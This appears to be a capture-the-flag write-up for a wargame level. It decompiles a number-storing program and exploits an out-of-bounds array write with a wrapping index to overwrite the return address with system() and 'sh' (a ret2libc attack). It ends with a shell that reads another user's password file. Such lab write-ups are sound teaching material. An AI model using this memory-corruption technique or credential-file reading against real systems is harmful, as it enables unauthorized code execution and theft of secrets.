# LEVEL 05

* decompile the binary:
    ```c
    int store_number(int *data)
    {
        int num = get_unum();
        int idx = get_unum();

        if (idx % 3 != 0 && (num >> 0x18) != 0xb7)
        {
                data[idx] = num;
                return (0);
        }
        ...
    }

    int main(int ac, char **av, char **env)
    {
        int input[25];
        int  error = 0;
        char cmd[20];

        ...
        while (1)
        {
            error = 1;
            fgets(cmd, 0x14, stdin);
            cmd[strlen(cmd) - 1] = 0;
            if (strncmp(cmd, "store", 5) == 0)
                error = store_number(input);
            ...
            else if(strncmp(cmd, "quit", 4) == 0)
                return(0);
            ...
        }
    }
    ```
    - read cmd from input 
    - if cmd is `"store"` call store_number(input)
        + read number and index
        + compare index % 3 != 0
        + if true: store the number in input at index
    ___

* prepare:
    - we need to override the return addres at input[114]
    - but 114 % 3 == 0
    - we find ``1073741938 where 0xffffd544 + 1073741938 == 0xffffd70c``
    ___

* exec bin:
    - write store
    - write 4159090384
    - write 1073741938
    - write store
    - write 134513381
    - write 116
    - write quit -> got shell prompt
    - cat /home/users/level08/.pass -> flag
    ___

* explanation
    ```
    0x080482e5 == 134513381 -> "sh"
    0xf7e6aed0 == 4159090384 -> system()
    0xffffd544 -> stack array(input)
    0xffffd70c -> return address
    0xffffd714 -> system() param address

    0xffffd70c - 0xffffd544 == 456
    456 / 4 = 114
    114 % 3 == 0 -> we can't use this index

    0xffffffff - 0xffffd544 == 10939
    10939 + 1 + 0xffffd70c == 4294967752
    4294967752 / 4  == 1073741938

    0xffffd544 + 1073741938 == 0xffffd70c !!!

    0xffffd714 - 0xffffd544 == 464
    464 / 4 = 116
    ```
